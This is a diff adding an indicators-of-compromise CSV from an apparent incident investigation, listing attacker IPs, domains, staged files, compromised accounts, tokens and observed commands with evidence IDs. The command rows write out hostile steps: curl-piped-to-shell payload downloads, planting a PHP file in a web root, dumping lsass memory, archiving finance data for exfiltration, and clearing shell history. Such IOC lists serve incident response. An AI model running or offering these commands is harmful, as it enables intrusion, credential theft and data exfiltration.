@@ -1,0 +1,30 @@
+type,value,first_seen,last_seen,related_asset,evidence_ids
+ip,198.51.100.77,2026-07-06T09:05:00+08:00,2026-07-06T09:20:14+08:00,web-prod-01,E001;E011;E013;E018;E019;E021
+ip,203.0.113.60,2026-07-06T09:16:10+08:00,2026-07-06T10:24:05+08:00,web-prod-01;ci-runner-01,E015;E016;E017;E072;E073
+ip,203.0.113.210,2026-07-06T11:08:01+08:00,2026-07-06T11:08:01+08:00,ops-jump-01,E092
+ip,203.0.113.77,2026-07-06T11:50:00+08:00,2026-07-06T11:50:18+08:00,ops-jump-01,E101;E104;E105;E106
+domain,update-cache.example,2026-07-06T09:16:10+08:00,2026-07-06T09:16:30+08:00,web-prod-01,E015;E016;E017
+domain,archive-sync-bkt.storage.example,2026-07-06T11:08:00+08:00,2026-07-06T11:15:30+08:00,ops-jump-01;ci-runner-01,E091;E094
+domain,cdn-sync.example,2026-07-06T11:50:00+08:00,2026-07-06T11:50:18+08:00,ops-jump-01,E101;E103
+file,/var/www/oa/public/.cache.php,2026-07-06T09:20:05+08:00,2026-07-06T09:20:17+08:00,web-prod-01,E020;E021;E022
+file,C:\Windows\Temp\ls.dmp,2026-07-06T10:27:00+08:00,2026-07-06T10:27:02+08:00,win-admin-01,E074;E076
+file,C:\Temp\finance_q2.7z,2026-07-06T10:49:00+08:00,2026-07-06T11:35:25+08:00,win-admin-01;ops-jump-01,E087;E096
+file,bi_part01.zst,2026-07-06T11:08:00+08:00,2026-07-06T11:35:25+08:00,ops-jump-01,E091;E096
+file,erp_full_20260705.tar.zst,2026-07-06T11:15:00+08:00,2026-07-06T11:15:30+08:00,ci-runner-01,E093;E094
+file,/tmp/.cache/.stage/full.tar,2026-07-06T11:35:25+08:00,2026-07-06T11:50:12+08:00,ops-jump-01,E096;E103
+account,deploy,2026-07-06T09:31:24+08:00,2026-07-06T11:50:12+08:00,web-prod-01;ops-jump-01,E029;E033;E035;E049;E103
+account,crm_ro,2026-07-06T09:51:00+08:00,2026-07-06T10:03:00+08:00,mysql-core-01,E038;E040;E041;E042;E043;E047
+account,svc_deploy,2026-07-06T10:05:00+08:00,2026-07-06T10:18:21+08:00,ops-jump-01;gitlab-01;jenkins-01,E049;E050;E056;E057;E058;E064;E065
+account,CORP\svc_backup,2026-07-06T10:02:00+08:00,2026-07-06T10:49:00+08:00,ad-dc-01;win-admin-01;file-srv-01,E044;E045;E046;E052;E053;E054;E055;E061;E062;E063;E069;E070;E071;E074;E075;E076;E082;E083;E084;E087
+account,bi_sync,2026-07-06T10:12:00+08:00,2026-07-06T10:19:20+08:00,pgsql-bi-01,E059;E066;E067;E068
+account,gitlab-runner,2026-07-06T10:24:00+08:00,2026-07-06T11:15:30+08:00,ci-runner-01,E072;E077;E094
+token,pat/deploy-token,2026-07-06T10:05:00+08:00,2026-07-06T10:05:18+08:00,gitlab-01,E049;E050
+token,system:serviceaccount:prod:ci-runner,2026-07-06T10:28:00+08:00,2026-07-06T10:42:09+08:00,k8s-master-01,E077;E078;E079;E080;E081;E085;E086
+command,bash -c curl -fsSL https://203.0.113.60/a.sh | sh,2026-07-06T09:16:10+08:00,2026-07-06T09:16:14+08:00,web-prod-01,E015;E016
+command,python3 -c write('/var/www/oa/public/.cache.php'),2026-07-06T09:20:05+08:00,2026-07-06T09:20:05+08:00,web-prod-01,E020
+command,bash -c curl -fsSL https://203.0.113.60/ci.sh | bash,2026-07-06T10:24:00+08:00,2026-07-06T10:24:05+08:00,ci-runner-01,E072;E073
+command,procdump.exe -ma lsass.exe C:\Windows\Temp\ls.dmp,2026-07-06T10:27:00+08:00,2026-07-06T10:27:02+08:00,win-admin-01,E074;E076
+command,robocopy \\file-srv-01\finance C:\Temp\f /E,2026-07-06T10:41:04+08:00,2026-07-06T10:41:04+08:00,file-srv-01;win-admin-01,E083
+command,7z.exe a C:\Temp\finance_q2.7z C:\Temp\f,2026-07-06T10:49:00+08:00,2026-07-06T10:49:00+08:00,win-admin-01,E087
+command,tar -cf /tmp/.cache/.stage/full.tar finance_q2.7z bi_part01.zst,2026-07-06T11:35:25+08:00,2026-07-06T11:35:25+08:00,ops-jump-01,E096
+command,history -c,2026-07-06T11:42:11+08:00,2026-07-06T11:42:11+08:00,ops-jump-01,E099
